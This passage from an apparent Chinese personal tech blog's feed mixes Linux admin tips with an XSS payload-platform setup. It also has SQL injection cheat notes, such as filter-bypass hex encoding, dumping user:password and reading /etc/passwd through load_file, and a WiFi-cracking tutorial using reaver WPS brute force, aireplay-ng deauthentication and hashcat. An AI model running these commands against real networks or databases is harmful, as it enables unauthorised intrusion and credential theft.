<li>*.tar.Z 用tar –xZf 解压 </li>
<li>*.rar 用 unrar e解压 </li>
<li>*.zip 用 unzip 解压</li>
</ol>
<h3 id="cmd打开图片"><a href="#cmd打开图片" class="headerlink" title="cmd打开图片"></a>cmd打开图片</h3><p><code>display a.jpg</code>or <code>eog a.jpg</code></p>
<h3 id="更改mac地址"><a href="#更改mac地址" class="headerlink" title="更改mac地址"></a>更改mac地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#wlan1 为设备 hw-&gt;hardware root权限</span></span><br><span class="line">ficonfig wlan1 down</span><br><span class="line">ifconfig wlan1 hw ether AA:AA:BB:CC:dd:EE</span><br><span class="line">ifconfig wlan1 up</span><br></pre></td></tr></table></figure>
<p>来自: <a href="http://man.linuxde.net/ifconfig" target="_blank" rel="external">http://man.linuxde.net/ifconfig</a></p>
<h3 id="更改文件所属用户-组"><a href="#更改文件所属用户-组" class="headerlink" title="更改文件所属用户/组"></a>更改文件所属用户/组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Code</span></span><br><span class="line">chown/chgrp userName fileName/floderName</span><br><span class="line"><span class="comment">#Example</span></span><br><span class="line">chown gust ~/home/genymotion</span><br><span class="line"><span class="comment">#将home目录的genymotion文件所属改为gust</span></span><br></pre></td></tr></table></figure>
<h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch ./test.txt</span><br></pre></td></tr></table></figure>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>-i info 删除前逐一确认<br>-f force 直接删除<br>-r recursion 递归删除,即把该文件所有的内容都删除<br>在linux没有回收站，文件或目录被删除之后就<code>无法再恢复</code></p>
<h3 id="打开GUI文件夹"><a href="#打开GUI文件夹" class="headerlink" title="打开GUI文件夹"></a>打开GUI文件夹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nautilus [option] /home/gust</span><br><span class="line"><span class="comment">#option --d&gt; manpage</span></span><br></pre></td></tr></table></figure>
<h3 id="wget临时代理"><a href="#wget临时代理" class="headerlink" title="wget临时代理"></a>wget临时代理</h3><p><code>wget -e &quot;http_proxy=http://&lt;ip&gt;:&lt;port&gt;/&quot; http://www.google.com</code></p>
<h2 id="System"><a href="#System" class="headerlink" title="System"></a>System</h2><h3 id="更改账户权限"><a href="#更改账户权限" class="headerlink" title="更改账户权限"></a>更改账户权限</h3><p>vi /etc/sudoers<br>找到 root ALL=(ALL) ALL<br>再后边增加 用户名 ALL=(ALL) ALL</p>
<h3 id="桌面-文档等文件改成英文"><a href="#桌面-文档等文件改成英文" class="headerlink" title="桌面 文档等文件改成英文"></a>桌面 文档等文件改成英文</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LANG=en_US.UTF-8 xdg-user-dirs-update</span><br><span class="line"><span class="comment">#如果注销重进失效,建议把 en_US 写到 ~/.config/user-dirs.locale 文件里再 xdg-user-dirs-update</span></span><br></pre></td></tr></table></figure>
<p>Reference:<br><a href="https://bbs.archlinuxcn.org/viewtopic.php?id=2488" target="_blank" rel="external">Archlinux-百合仙子</a><a href="http://blog.csdn.net/topgun_chenlingyun/article/details/8159550" target="_blank" rel="external">TOPFUN</a></p>
<h3 id="手动添加快捷键"><a href="#手动添加快捷键" class="headerlink" title="手动添加快捷键"></a>手动添加快捷键</h3><p><a href="http://blog.csdn.net/longerzone/article/details/8932751" target="_blank" rel="external">longerzone</a></p>
<h3 id="设置全局-apt-get代理"><a href="#设置全局-apt-get代理" class="headerlink" title="设置全局/apt-get代理"></a>设置全局/apt-get代理</h3><h4 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h4><p><code>export http_proxy=&quot;http://user:pass@youProxyAddress:port/&quot;
export https_proxy=&quot;http://user:pass@youProxyAddress:port/&quot;</code></p>
<h4 id="Apt-get"><a href="#Apt-get" class="headerlink" title="Apt-get"></a>Apt-get</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/apt.conf</span><br><span class="line"><span class="comment">#添加下列内容</span></span><br><span class="line">Acquire &#123;</span><br><span class="line">　　      http::proxy <span class="string">"http://user:pass@yourProxyAddress:port"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Reference<br><a href="https://sites.google.com/site/debianpackageshare/Home/linux-tips/page-47" target="_blank" rel="external">@carlosloveleo</a></p>
<h3 id="修改默认编辑器"><a href="#修改默认编辑器" class="headerlink" title="修改默认编辑器"></a>修改默认编辑器</h3><p>1.不适用sublime</p>
<blockquote>
<p>sudo update-alternatives –config editor</p>
</blockquote>
<p>2.任意,在<code>/usr/share/applications/</code>目录中添加或者使用已有的desktop</p>
<blockquote>
<p>sudo vim /etc/gnome/defaults.list<br>将gedit.desktop批量替换为 编辑器.desktop </p>
</blockquote>
<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><ol>
<li>sudo su</li>
<li>tar<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -cvpzf /media/gust/Bak/Kali_bak/backup.tgz --exclude=/media --exclude=/proc --exclude=/lost+found --exclude=/backup.tgz --exclude=/mnt --exclude=/sys /</span><br><span class="line"><span class="comment"># 最后的/为需要备份的目录</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="增量备份及差别"><a href="#增量备份及差别" class="headerlink" title="增量备份及差别"></a>增量备份及差别</h4><pre><code>tar -czvf -g zeng aa.tar.gz /var
tar -czvf -g zeng aa.tar.gz.1 /var
</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvpzf /media/gust/Bak/Kali_bak/backup.tgz.1 --exclude=/media --exclude=/proc --exclude=/lost+found --exclude=/backup.tgz --exclude=/mnt --exclude=/sys  /</span><br></pre></td></tr></table></figure>
<p>backup.tgz.1 后面的’.1’为标志</p>
<p>差量备份:只备份上次完全备份以后有变化的数据(他针对的上次的完全备份,他备份过程中不清除存档属性)<br>增量备份:只备份上次备份以后有变化的数据.(他才不管是那种类型的备份,有变化的数据就备份,他会清除存档属性)</p>
<p>Reference:<br><a href="http://blog.chinaunix.net/uid-23225855-id-3182334.html" target="_blank" rel="external">一片浮云而已</a><br><a href="http://www.blogjava.net/MEYE/archive/2011/08/25/357250.html" target="_blank" rel="external">MEYE</a></p>
<h3 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h3><h4 id="临时"><a href="#临时" class="headerlink" title="临时"></a>临时</h4><p>添加:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$PATH</span>:需要添加的路径"</span></span><br></pre></td></tr></table></figure></p>
<p>参考:<a href="http://www.a1ex.net/10/15/2015/bash2/" target="_blank" rel="external">bash基本命令2</a></p>
<h4 id="永久-lifetime"><a href="#永久-lifetime" class="headerlink" title="永久(lifetime)"></a>永久(lifetime)</h4><p>所有用户:/etc/profile<br>独立用户:/root/.bashrc or /home/你的用户/.bashrc</p>
<h3 id="脚本自启动"><a href="#脚本自启动" class="headerlink" title="脚本自启动"></a>脚本自启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment">#file name : test</span></span><br><span class="line"><span class="comment">### INIT INFO</span></span><br><span class="line">    Your Codes</span><br></pre></td></tr></table></figure>
<ol>
<li>移动,更改权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mv <span class="built_in">test</span> /etc/init.d/</span><br><span class="line">sudo chmod 775 /etc/init.d/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="两种添加-删除方式"><a href="#两种添加-删除方式" class="headerlink" title="两种添加/删除方式"></a>两种添加/删除方式</h4><ol>
<li><p>insserv方式 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo insserv /etc/init.d/test   #启动服务</span><br><span class="line">sudo insserv -r /etc/init.d/test #删除服务</span><br></pre></td></tr></table></figure>
</li>
<li><p>update-rc.d </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-rc.d <span class="built_in">test</span> defaults 95 <span class="comment">#启动服务 95为脚本启动顺序</span></span><br><span class="line">sudo update-rc.d <span class="_">-f</span> /etc/init.d/<span class="built_in">test</span> remove <span class="comment">#删除服务</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="查看服务状态"><a href="#查看服务状态" class="headerlink" title="查看服务状态"></a>查看服务状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/<span class="built_in">test</span> status <span class="comment">#查看服务状态/日志</span></span><br></pre></td></tr></table></figure>
<p>执行之后存在warning,测试好像没有影响</p>
<p>Reference:<br><a href="http://wenzhixin.net.cn/2013/10/30/debian_script_init" target="_blank" rel="external">文翼’s blog</a><br><a href="http://www.linuxidc.com/Linux/2011-12/48922.htm" target="_blank" rel="external">Linux 公社</a></p>
<h4 id="Ubuntu-rc-local"><a href="#Ubuntu-rc-local" class="headerlink" title="Ubuntu-rc.local"></a>Ubuntu-rc.local</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/rc.local</span><br><span class="line"><span class="comment">#添加bash内容 适用于小脚本</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
<p><a href="http://wangheng.org/ubuntu-to-add-boot-script.html" target="_blank" rel="external">王恒’s Blog</a></p>
<h2 id="SoftWare"><a href="#SoftWare" class="headerlink" title="SoftWare"></a>SoftWare</h2><h3 id="协会大神推荐的DSL神器"><a href="#协会大神推荐的DSL神器" class="headerlink" title="协会大神推荐的DSL神器"></a>协会大神推荐的DSL神器</h3><p><a href="http://manpages.ubuntu.com/manpages/saucy/man1/nm-connection-editor.1.html" target="_blank" rel="external">nm-connection-editor</a></p>
<h3 id="Chrome地址栏输入卡死"><a href="#Chrome地址栏输入卡死" class="headerlink" title="Chrome地址栏输入卡死"></a>Chrome地址栏输入卡死</h3><p>系统字体设置为<code>Droid Sans Fallback</code>,或者自己体验不错的,原生最好= =<br>Reference:<br><a href="http://forum.ubuntu.org.cn/viewtopic.php?t=468448" target="_blank" rel="external">牛牛博客</a><br><a href="http://suselinks.us/how-to-fix-slow-typing-in-chrome-addressbar-in-linux/" target="_blank" rel="external">Ubuntu forum</a></p>
<h3 id="root帐号无法启动chrome"><a href="#root帐号无法启动chrome" class="headerlink" title="root帐号无法启动chrome"></a>root帐号无法启动chrome</h3><p><code>#vi /opt/google/chrome/google-chrome</code><br>在最后一行尾加入 –user-data-dir<br>Reference:<br><a href="http://blog.sina.com.cn/s/blog_40983e5e0101dhz0.html" target="_blank" rel="external">午后等风来</a></p>
<h3 id="Sublime"><a href="#Sublime" class="headerlink" title="Sublime"></a>Sublime</h3><h4 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h4><p><a href="http://www.simonewebdesign.it/how-to-install-sublime-text-3-on-debian/" target="_blank" rel="external">how-to-install-sublime-text-3-on-debian</a></p>
<h4 id="浏览器打开当前文件"><a href="#浏览器打开当前文件" class="headerlink" title="浏览器打开当前文件"></a>浏览器打开当前文件</h4><p>(= ,=发现只要尝试一下就能出代码..)<br><code>Tools -&gt; Build System -&gt; New Build System</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"shell_cmd"</span>: <span class="string">"google-chrome '<span class="variable">$file</span>'"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="linux-java8"><a href="#linux-java8" class="headerlink" title="linux -java8"></a>linux -java8</h3><p>请以root账户进行下列操作</p>
<ol>
<li>下载<br>通过<a href="http://www.java.com/en/download/manual.jsp" target="_blank" rel="external">JDK地址</a>找到适合自己的jdk(不需要允许java许可协议,具体请移步<a href="http://www.tsingpost.com/index.php/archives/463/" target="_blank" rel="external">TsingPost</a>)<br>下载的文件以tar.gz结尾,为了方便可以改名例如:<code>java8.tar.gz</code></li>
<li>解压移动<br>cd /usr/lib<br>mkdir jvm #一些发行版可能提示已存在,可以升级java版本..<br>进入java8.tar.gz所在目录<code>tar -xzvf java8.tar</code><br>解压之后,将文件移至jvm文件夹 <code>mv jre1.8.0_60 /usr/lib/jvm</code></li>
<li>环境变量<br>当前用户: <code>sudo gedit ~/.bashrc</code><br>全局: <code>sudo gedit /etc/profile</code><br>在文件的结尾添加以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/jre1.8.0_60   <span class="comment">#换成你改的名字    </span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><code>source ~/.bashrc</code> #重新读取一下让新加的代码生效 全局的话换一下地址</p>
<ol>
<li>Reference:<br><a href="http://www.tsingpost.com/index.php/archives/463/" target="_blank" rel="external">TsingPost</a><br><a href="http://blog.bilicloud.com/?p=20" target="_blank" rel="external">BlackFox</a></li>
</ol>
<h3 id="jython安装"><a href="#jython安装" class="headerlink" title="jython安装"></a>jython安装</h3><ol>
<li>安装<br><code>java -jar jython-installer-2.7.0.jar</code></li>
<li>添加环境变量<br>此步骤参考java环境变量,现在只需要在原来java环境变量的<br><code>CLASSPATH</code>添加     <code>你的位置/jython2.7.0/jython.jar</code><br><code>PATH</code>              添加     <code>你的位置/jython2.7.0</code></li>
<li>注销使之生效</li>
</ol>
<h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><p>github-SSH链接-&gt;<a href="http://jianganglu.github.io/2015/08/28/git-ssh/" target="_blank" rel="external">jianganglu Blog</a><br>千万别用sudo..T T</p>
<h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>windows:<br>rdesktop -u 帐号 -p 密码 [-f] ip地址<br>-f 默认全屏   Ctrl+ Alt +Enter 退出全屏<br>Reference: <a href="http://blog.csdn.net/zjjyliuweijie/article/details/7048984" target="_blank" rel="external">zjjyliuweijie</a><br>linux: vncviewer -</p>
<h3 id="torrent下载工具"><a href="#torrent下载工具" class="headerlink" title="torrent下载工具"></a>torrent下载工具</h3><p>qbittorrent   ktorrent  rtorrent    azureus   deluge<br>介绍在这:<a href="http://tiancong.blog.51cto.com/783138/829701" target="_blank" rel="external">tiancong 的BLOG</a></p>
<h2 id="Device-Driver"><a href="#Device-Driver" class="headerlink" title="Device/Driver"></a>Device/Driver</h2><h3 id="网卡驱动"><a href="#网卡驱动" class="headerlink" title="网卡驱动"></a>网卡驱动</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p><code>网卡连接一段时间之后自动断开,只能重启</code></p>
<h4 id="办法"><a href="#办法" class="headerlink" title="办法"></a>办法</h4><ol>
<li>前往github看看有没有自己的型号<a href="https://github.com/lwfinger/rtlwifi_new" target="_blank" rel="external">rtl-github</a>,如果有就clone下来<code>clone https://github.com/phuslu/goagent.git</code> </li>
<li><p>或者下载zip之后解压<br>3.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> rtlwifi_new/</span><br><span class="line">sudo make </span><br><span class="line">sudo make install </span><br><span class="line">modprobe -v rtl8723be<span class="comment">#换成你自己的网卡型号</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭网卡的自动休眠<br><code>sudo echo &quot;options rtl8723be fwlps=0 swlps=0&quot; &gt; /etc/modprobe.d/rtl8723be.conf</code><br>Reference:<br><a href="https://linux.cn/blog-10161-5871.html" target="_blank" rel="external">7th</a></p>
</li>
</ol>
<h3 id="连接路由LAN端口上网"><a href="#连接路由LAN端口上网" class="headerlink" title="连接路由LAN端口上网"></a>连接路由LAN端口上网</h3><ol>
<li><p>设置路由器的IP:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/resolv.conf</span><br><span class="line">nameserver 192.168.1.1</span><br><span class="line"><span class="comment">#192.168.1.1为网关地址,即路由器管理地址</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>给本机添加IP(DHCP)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/network/interfaces</span><br><span class="line"><span class="comment">#--添加--</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"><span class="comment">#---</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>好像有点小BUG:<br>如果开机过程没有插网线,会一直搜索大概1分钟<br>Reference:<br><a href="http://tieba.baidu.com/p/3247330238" target="_blank" rel="external">贴吧</a></p>
<h3 id="gnome"><a href="#gnome" class="headerlink" title="gnome"></a>gnome</h3><p>打开了一张奇怪的图片,然后就崩了,直接被注销<br>搞了半天也看了gnome的错误日志,然后找到论坛<a href="http://forum.ubuntu.org.cn/viewtopic.php?f=94&amp;t=378902" target="_blank" rel="external">ubuntu12.04安装gnome shell主题，给新手们</a><br>最后发现这个网站<a href="https://extensions.gnome.org/" target="_blank" rel="external">extensions.gnome</a><br><code>firefox</code>打开     然后选择一下插件,不用管warning…<br>备用:<br><a href="http://itsfoss.com/install-switch-themes-gnome-shell/" target="_blank" rel="external">How To Install And Switch Themes In GNOME Shell In Ubuntu</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[XSS平台搭建]]></title>
      <url>http://csser.work/12/30/2015/xss-xssPlatform/</url>
      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>平台名为:<code>sleep-puppy</code>  大名鼎鼎的Netflix搞的一个安全项目<br>环境/框架: <code>Flask + Gunicorn + Nginx</code><br>可以选择docker镜像包安装,还是歪果仁会玩,正好见识一下docker怎么搞得</p>
<h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>DigitalOcean已经打包完了,直接执行命令即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://get.docker.com/ | sh</span><br><span class="line"><span class="comment"># 将用户添加至docker用户组</span></span><br><span class="line">$ sudo usermod <span class="_">-a</span>G docker $(whoami)</span><br><span class="line"><span class="comment">#安装 Docker Compose</span></span><br><span class="line">$ sudo apt-get -y install python-pip  <span class="comment">#环境</span></span><br><span class="line">$ sudo pip install docker-compose</span><br></pre></td></tr></table></figure>
<p>不过发现国内这局域网…换成国内源吧,[daocloud],地址在Reference中</p>
<h2 id="sleep-puppy安装"><a href="#sleep-puppy安装" class="headerlink" title="sleep-puppy安装"></a>sleep-puppy安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Netflix/sleepy-puppy-docker</span><br><span class="line">$ docker-machine ls</span><br><span class="line"><span class="comment">#docker-compose.yaml中IP改成自己的公网IP</span></span><br><span class="line">$ <span class="built_in">cd</span> sleepy-puppy-docker &amp;&amp; docker-compose up</span><br></pre></td></tr></table></figure>
<p>默认账号密码<br>user: admin<br>pass: password<br>//—-PS:大半个月前搭的,具体的坑已经差不多网完了..= =</p>
<h2 id="简单的API使用"><a href="#简单的API使用" class="headerlink" title="简单的API使用"></a>简单的API使用</h2><p><a href="http://www.tothenew.com/blog/using-sleepy-puppy-a-cross-site-scripting-payload-management-framework/" target="_blank" rel="external">ToTheNewDigital</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/netflix/sleepy-puppy/wiki/setup" target="_blank" rel="external">github_sleep-puppy</a><br><a href="https://docs.docker.com/engine/installation/ubuntulinux/" target="_blank" rel="external">doc.docker</a>&lt;-纯手动安装<br><a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-compose-on-ubuntu-14-04" target="_blank" rel="external">digitalocean</a>&lt;-自动安装+基本docker操作<br><a href="https://get.daocloud.io/" target="_blank" rel="external">daocloud</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[sql日常记录]]></title>
      <url>http://csser.work/12/21/2015/daily-sql/</url>
      <content type="html"><![CDATA[<ol>
<li>字符串截取<br> left(str, len);    /    right(str, len);        //len&gt;= 0<br> i.e.    :    select left(‘abcde’, 4);            //截取前面四个</li>
<li>char(60,112,62)<br> <p>            //可以用来字符截取,字太多了</p></li>
<li>version()            -&gt;5.6.11</li>
<li>limit m,n           m-start      n–length    <code>开始为0</code><br>limit n             n–length</li>
<li>cast(value as type)       获取一个类型的值,并转换类型<br>convert(type ,value)      转换类型      type -&gt;signed unsigned<br>cast(‘a’ as signed)             返回0        cast(‘123’ as int)    返回123<br>convert( int ,’123’)        返回123</li>
<li>concat( a, b)  连接函数,对ab进行连接</li>
<li>mit(a,1,50)       1-50 截取字符串</li>
<li>select * from (xxx)a    a为别名</li>
<li>group by xx   以字段分类</li>
<li>select count(*)   返回统计的行数</li>
<li>0x7171    类似于高亮,更加明显</li>
<li>IFNULL(a,0x22)        判断是否为NULL,是的话就返回0x22,否则返回a</li>
<li>0x7423 的写法可以规避单引号过滤 </li>
<li>distinct 过滤重复</li>
<li>group_concat( user ,0x3a, password)<br>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来.要返回哪些列,由函<br>数参数(就是字段名)决定.分组必须有个标准,就是根据group by指定的列进行分组    <a href="http://www.cnblogs.com/wangtao_20/archive/2011/02/23/1961860.html" target="_blank" rel="external">王滔’s blog</a>‘</li>
<li>char(115)  unicode-&gt;string</li>
<li>version()  @@version         版本号</li>
<li>@@datadir         mysql物理路径</li>
<li>user()     当前的mysql用户        example: root@localhost</li>
<li>load_file()     加载物理路径,需要file_priv权限<br>windows: load_file(‘c:\boot.ini’)<br>linux:     load_file(‘/etc/passwd’)<br>可以利用hex编码避免php的正则匹配 load_file(0x编码后字符)</li>
<li>ORD()     ord(‘i’)    返回第一个字符的ASCII</li>
<li>EXISTS()     指定一个子查询，检测行的存在返回Blooean结果</li>
<li>MID(String, Start [, Length])          取子串        MySQL<br>[substring/]substr(String,Start[,Length])        取子串        支持SQL Server,Oracle[MySQL]<br>注意:<code>开始位置为1</code> 但是0为起始点不会报错,不过不回显示任何东西</li>
<li>WHERE itemid (REGEXP 0x5b5e302d395d)     <code>REGEXP</code>正则对象的使用</li>
<li><code>----手动高亮----</code><br>concat( select database() ) 会导致mysql语法错误,想了一会儿知道原因了…<br><code>concat( (select database()) , &#39;xxx&#39; );</code>   看完这句话然后默默的删掉’xxx’,然后自然就懂啦</li>
<li>length( )    显示长度,返回int</li>
<li>ascii()    字符转ascii<br>  char()    ascii转字符</li>
<li></li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[wifi密码破解]]></title>
      <url>http://csser.work/11/15/2015/wifi-crack/</url>
      <content type="html"><![CDATA[<h2 id="WPS破解"><a href="#WPS破解" class="headerlink" title="WPS破解"></a>WPS破解</h2><h3 id="使用网卡混杂模式-monitor"><a href="#使用网卡混杂模式-monitor" class="headerlink" title="使用网卡混杂模式(monitor)"></a>使用网卡混杂模式(monitor)</h3><p>airmon-ng 查看网卡信息<br>airmon-ng start wlan0<br><img src="/imgs/wifiCrack/wps1.png" alt="1"></p>
<h4 id="出现process占用"><a href="#出现process占用" class="headerlink" title="出现process占用"></a>出现process占用</h4><p>airmon-ng check           查看占用进程<br>iwconfig                  查看网卡是否处于monitor状态<br>sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill</p>
<h3 id="查看wps"><a href="#查看wps" class="headerlink" title="查看wps"></a>查看wps</h3><ol>
<li><blockquote>
<p>sudo wash -i wlan0mon -C</p>
</blockquote>
</li>
</ol>
<p>WPS Locked 为no 即可用wps<br><img src="/imgs/wifiCrack/wps2.png" alt="2"></p>
<ol>
<li><blockquote>
<p>airodump-ng wlan0mon</p>
</blockquote>
</li>
</ol>
<p>54e.    有点为wps<br>(MB选项的54e.和54e已经不能判断wps了)<br><img src="/imgs/wifiCrack/wps3.png" alt="3"></p>
<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1<br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1<br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
<p>-c    Channel信道 信道可从上面的airodump找出来</p>
<p><img src="/imgs/wifiCrack/wps4.png" alt="4"></p>
<p>一般PIN码大概要个12-24小时左右的时间233[如果有60S的防PIN功能]<br>中断重pin的话找到MAC.wpc放入<code>/etc/reaver/</code>或者直接加上-p 前四位pin码就能继续</p>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>1.<br>   [+] Sending EAPOL START request<br>  [!] WARNING: Receive timeout occurred<br>  一般是信号太差<br>2.<br>    [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking<br>    一般路由器的防PIN措施,还没碰到网上所说的300s….这个措施保证了PIN的可破解性</p>
<ol>
<li><h3 id="存储文件"><a href="#存储文件" class="headerlink" title="存储文件"></a>存储文件</h3><p>Version 1.5     —-/etc/reaver/MAC.wpc<br>Version 1.4     —-/usr/local/etc/reaver/MAC.wpc </p>
</li>
</ol>
<h3 id="重新上网"><a href="#重新上网" class="headerlink" title="重新上网"></a>重新上网</h3><blockquote>
<p>service network-manager start</p>
</blockquote>
<h2 id="关于暴力破解"><a href="#关于暴力破解" class="headerlink" title="关于暴力破解"></a>关于暴力破解</h2><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><blockquote>
<p><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">http://www.secbox.cn/hacker/wireless/4877.html</a></p>
<ol>
<li>airodump-ng -w freedom -c CH –bssid  mac地址 wlan0mon –ignore-negative-one<br>CH表示信道，信道是多少就填多少，freedom是一会抓握手包的文件名字，他会自动生成一个freedom.cap的文件，这个名字随便你们填什么</li>
<li>重新开一个客户端输入命令：<br>aireplay-ng –deaut 10 -a 路由器mac -c 客户端mac wlan0mon –ignore-negative-one</li>
</ol>
</blockquote>
<h3 id="跑包"><a href="#跑包" class="headerlink" title="跑包"></a>跑包</h3><p><code>cudaHashcat</code>, advanced password recovery #鉴于windows独立显卡的支持比较好,在windows平台工作非常棒,GPU跑包咻咻咻的快</p>
<p>下面为常用参数<br>cudaHashcat64.exe –attack-mode 0<br>-m /–hash-type 2500<br>-a / –attack-mode 0<br>–segment-size 3036      内存缓存大小<br>–gpu-loops 1000           Gpu性能<br>–gpu-accel 160              负载优化<br>–increment –increment-min 8 –increment-max 10</p>
<p>这个是实例 —-   .txt后缀都是密码包,关键还是要看弱密码的数据质量了=, =  跑几个G还是很快的</p>
<blockquote>
